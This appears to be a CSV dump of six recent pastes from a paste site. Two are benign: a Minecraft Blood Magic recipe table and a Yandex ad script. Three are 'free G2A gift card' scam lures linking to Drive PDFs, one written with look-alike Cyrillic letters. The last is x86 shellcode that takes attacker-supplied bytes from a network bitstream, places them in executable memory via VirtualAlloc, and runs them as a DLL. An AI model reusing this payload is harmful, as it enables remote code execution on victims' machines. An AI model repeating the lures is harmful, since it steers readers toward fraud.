id,title,username,language,date,content
VVVQr7i3,ATM9 - PCM.v2 Recipe Table - Blood Magic Altar,iarspider,JSON,Monday 22nd of April 2024 07:06:00 AM CDT,"{
	""bloodmagic:altar/demonicslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:infusedslate""}
		],
		""output"": {""item"": ""bloodmagic:demonslate""}
	},
	""bloodmagic:altar/reinforcedslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:blankslate""}
		],
		""output"": {""item"": ""bloodmagic:reinforcedslate""}
	},
	""bloodmagic:altar/slate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""minecraft:stone""}
		],
		""output"": {""item"": ""bloodmagic:blankslate""}
	},
	""bloodmagic:altar/imbuedslate"": {
		""multiplier"": 1,
		""input"": [
			{""item"": ""bloodmagic:reinforcedslate""}
		],
		""output"": {""item"": ""bloodmagic:infusedslate""}
	}
}"
ViFZB9fX,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 💰,ssss50w,GetText,Monday 22nd of April 2024 06:48:35 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
22 April 2024"
p1FHnd9z,лента LUXUP + floorAd ВМа,Luxup,JavaScript,Monday 22nd of April 2024 06:44:09 AM CDT,"<script>
  let show_topad_yandex = function () {
    if (!document.documentElement.classList.contains('yandex-ad-on-screen')) {
      window.yaContextCb.push(()=>{
        Ya.Context.AdvManager.render({
          ""blockId"": ""R-A-5518567-2"",
          ""type"": ""floorAd"",
          statId: 1
        });
      });
    }
  }

  let checkAndDestroyAd = function() {
    if (document.documentElement.classList.contains('yandex-ad-on-screen')) {
      Ya.Context.AdvManager.destroy({blockId: 'R-A-5518567-2'});
    }
  }

  setInterval(function() {
    checkAndDestroyAd();
    show_topad_yandex();
  }, 2000);

  document.documentElement.addEventListener('luxupYandexFeedOnScreen', (e) => { 
    if (e.detail && e.detail.onScreen) {
      document.documentElement.classList.add('yandex-ad-on-screen');
    } else { 
      document.documentElement.classList.remove('yandex-ad-on-screen');
      show_topad_yandex();
    }
  });
</script>"
swXnALvh,🤑 G2A.com Free Gift Card Guide Apr 2024 NEW 🤑,x2w,GetText,Monday 22nd of April 2024 06:39:23 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  

Working as of:
22 April 2024"
T0hsrh71,👾G2A.com Free Gift Card Guide Apr 2024 NEW👾,jordanthebordan,GetText,Monday 22nd of April 2024 06:37:57 AM CDT,"G2А.com frеe gift cаrd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to dаte versiоn of this scriрt. Any оther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/14G2eGlj-b_L6M7-S1ou5gAZFP5wLLg-t/view
 
Working as of:
22 April 2024"
9vJRvJAV,Untitled,Hidend,ASM (NASM),Monday 22nd of April 2024 06:14:37 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3       
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3       
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

cmp ecx, 0
je epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax
jmp epilogue

;# epilogue
epilogue:
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
